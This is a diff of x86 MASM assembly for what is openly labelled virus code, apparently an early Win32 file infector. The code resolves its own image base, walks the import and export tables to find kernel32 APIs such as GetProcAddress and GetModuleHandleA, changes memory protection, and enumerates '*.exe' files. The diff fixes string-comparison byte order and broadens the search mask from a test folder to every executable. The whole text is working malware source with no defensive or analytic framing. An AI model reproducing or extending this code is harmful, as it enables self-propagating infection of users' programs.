@@ -13,11 +13,12 @@ option casemap:none
    includelib masm32.lib
    
 .data
-FindFirstFileError              BYTE                        "FindFirstFile failed ", 0
-FindFirstFileSuccess            BYTE                        "First file found with success ", 0
-FindNextFileError               BYTE                        "FindNextFile failed ", 0
-FindNextFileSuccess             BYTE                        "FirstNextFile found with success ", 0
-FolderFound           		  BYTE                        "Folder found", 0
+FindFirstFileError              		BYTE                        "FindFirstFile failed ", 0
+FindFirstFileSuccess            		BYTE                        "First file found with success ", 0
+FindNextFileError               		BYTE                        "FindNextFile failed ", 0
+FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
+FolderFound           		  		BYTE                        "Folder found", 0
+EndObjecTable					BYTE				    "End of object table",0
 
 fileFilter 						db 							"*.*",0
 backDir 						db 							"..",0
@@ -31,7 +32,7 @@ hDir 							db 							256 dup (?)
 ErrorCode                                 DWORD                       			? 
 
 .code
-; ---------------------------------------------------------------------------
+; -----------------------------------;
 virusCode:
 	pushad
 	pushfd
@@ -40,15 +41,15 @@ delta:
 	pop ebp
 	mov eax,ebp
 	sub ebp,delta
-	call save_imagebase
-save_imagebase:
-	pop eax
-	;and eax,0xFFF00000		            ; ...00000
+	sub eax,offset delta - offset virusCode
+	sub eax,00001000h
 	mov [ebp+image_base],eax			; save image base
-scan_import:
-	xor eax,eax
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------Find import section-------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 	mov esi,[image_base+ebp]			; point on image base
-	mov eax,esi
 	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
 	mov eax,[eax]					; get the value (PE header value)
 	add eax,esi						; +image_base (point to PE header)
@@ -57,9 +58,9 @@ scan_import:
 	add eax,esi						; now point to import table (+ image_base)
 	add eax,12						; +CH (point to .dll)   
 	
-	;mov eax,[image_base+ebp+3ch]
-	;add eax,128
-	;mov eax,[image_base+]
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;------------Scan import-------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_kernel32:
 	xor ebx,ebx						; reset ebx
 	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
@@ -75,31 +76,28 @@ find_kernel_image_base:					; go to find kernel in image base
 	add eax,esi						; + image_base
 	mov eax,[eax]					; now eax=address of 1st API from kernel32
 	xchg edi,eax					; swap with edi, edi=address of 1st API
-	
 find_MZ_in_kernel:
 	dec edi						; decrease edi
-	mov esi,edi						; 
-	cmp word ptr [edi],"MZ"				; check MZ
+	mov esi,edi						;	 
+	cmp word ptr [edi],"ZM"				; check MZ
 	jne find_MZ_in_kernel				; not found then loop
-	
+
+	mov esi,edi
 	mov esi,[esi+3CH]					; if ok, move to header relocation then get value
 	cmp esi,dword  ptr 200H				; cmp if header reloc=200H
 	ja find_MZ_in_kernel				; if >200H jmp then loop
 	
 	add esi,edi						; go to new header
-	cmp word ptr [esi],"PE"				; check PE
+	cmp word ptr [esi],"EP"				; check PE
 	jne find_MZ_in_kernel				; no loop again
 	add esi,52						; point to image_base_dword
-	
-	cmp edi,dword ptr [esi]				; check if edi=image_base 
+	cmp edi,[esi]				      ; check if edi=image_base 
 	jne find_MZ_in_kernel				; loop again
 	
 	mov esi,edi						; esi=image base of kernel32.dll 
 	add esi,3CH						; mov to header relocation
 	mov esi,[esi]					; get value
-	
 	add esi,edi						; +image base => PE header
-	
 	add esi,120						; move to export table
 	mov esi,[esi]					; get value
 	add esi,edi						; +image_base->esi point to the export table !!!
@@ -128,6 +126,7 @@ find_API:
 	push 1000h									; 1000 bytes
 	push dword ptr[ebp+image_base]
 	call [ebp+VirtualProtectAddress]
+	
 find_first_file:
 	push dword ptr [ebp+Win32Data]
 	push dword ptr [ebp+search_mask]
@@ -139,43 +138,24 @@ find_next_file:
 	je done_find
 done_find:
 	ret
-	invoke ExitProcess,00
-GetAPIAddress:
-	push dword ptr[ebp+FindFirstFileAStr]
-	push dword ptr[ebp+handle]                  ; module handle
-	call [ebp+GetProcAddressAddress]
-	mov [ebp+FindFirstFileAAddress],eax	
-	
-	ret
+	invoke ExitProcess,0
 is_it_kernel32: 				; check is it kernel32.dll
 	xor ecx,ecx				; reset ecx
 	mov ebx,dword ptr [eax]		; set ebx=[eax]
 	add ebx,esi				; add image_base
-	cmp dword ptr[ebx],"kern"	; cmp with Kern
+	cmp dword ptr[ebx],"nrek"	; cmp with Kern
 	jne az1				; if not equal jmp to az1
 	inc ecx				; else ecx+=1
-case_2:
-	cmp dword ptr[ebx],"Kern"
-	jne az1
-	inc ecx
 az1:		
-	cmp dword ptr[ebx+4],"el32"	; mov to next 4 bit then cmp with "el32"
+	cmp dword ptr[ebx+4],"23le"	; mov to next 4 bit then cmp with "el32"
 	jne az2				; if not jmp to az2
 	inc ecx				; else ecx+=1
-az1_case_2:
-	cmp dword ptr[ebx+4],"EL32"
-	jne az2
-	inc ecx
 az2:	
-	cmp dword ptr[ebx+16],".DLL"	;
+	cmp dword ptr[ebx+8],"lld."	;
 	jne az3				;
 	inc ecx				; else ecx+=1
-az2_case_2:
-	cmp dword ptr[ebx+16],".dll"
-	jne az3
-	inc ecx
 az3:	
-	ret
+ret
 	
 find_ProcAddress:
 	xor eax,eax
@@ -200,7 +180,7 @@ find_ProcAddress:
 	mov eax,[ebx]
 	add eax,edi
 search_procaddress:
-	cmp dword ptr[eax],"GetP"
+	cmp dword ptr[eax],"PteG"
 	je search_procadress_1
 back_search_procadress:
 	add ebx,4
@@ -210,15 +190,15 @@ back_search_procadress:
 	add ebp,4
 	jmp search_procaddress
 search_procadress_1:	
-	cmp dword ptr[eax+4],"rocA"
+	cmp dword ptr[eax+4],"Acor"
 	jne back_search_procadress
 	inc ecx
 search_procadress_2:
-	cmp dword ptr[eax+8],"ddre"
+	cmp dword ptr[eax+8],"erdd"
 	jne back_search_procadress
 	inc ecx
 search_procadress_3:
-	cmp dword ptr[eax+12],"ss"
+	cmp word ptr[eax+12],"ss"
 	jne back_search_procadress
 	inc ecx
 search_procadress_4:
@@ -249,7 +229,7 @@ find_GetModuleHandle:
 	mov eax,[ebx]
 	add eax,edi
 search_module:	
-	cmp dword ptr[eax],"GetM"
+	cmp dword ptr[eax],"MteG"
 	je search_module_1
 back_search_module:
 	add ebx,4
@@ -259,27 +239,38 @@ back_search_module:
 	add ebp,4
 	jmp search_module
 search_module_1:
-	cmp dword ptr[eax+4],"odul"
+	cmp dword ptr[eax+4],"ludo"
 	jne back_search_module
 	inc ecx
 search_module_2:
-	cmp dword ptr[eax+8],"eHan"
+	cmp dword ptr[eax+8],"naHe"
 	jne back_search_module
 	inc ecx
 search_module_3:
-	cmp dword ptr[eax+12],"dleA"
+	cmp dword ptr[eax+12],"Aeld"
 	jne back_search_module
 	inc ecx
 search_module_4:
 	mov ebp,[ebp]
 	add ebp,edi
 	ret	
+
+GetAPIAddress:
+	push dword ptr[ebp+FindFirstFileAStr]
+	push dword ptr[ebp+handle]                  ; module handle
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+FindFirstFileAAddress],eax	
+ret	
+
+end_objecttable: 
 	
-end_objecttable:
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;--------------------------------Data---------------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 image_base    				dd    0h 
 kernel_string   		      	db    "kernel32.dll", 0 
-search_mask    				db    "C:\Documents and Settings\F.U.C.K\Desktop\test\*.exe", 0 
+search_mask    				db    "*.exe", 0 
 handle       				dd    0h
 GetProc     				dd    0h
 file_handle    				dd    0h
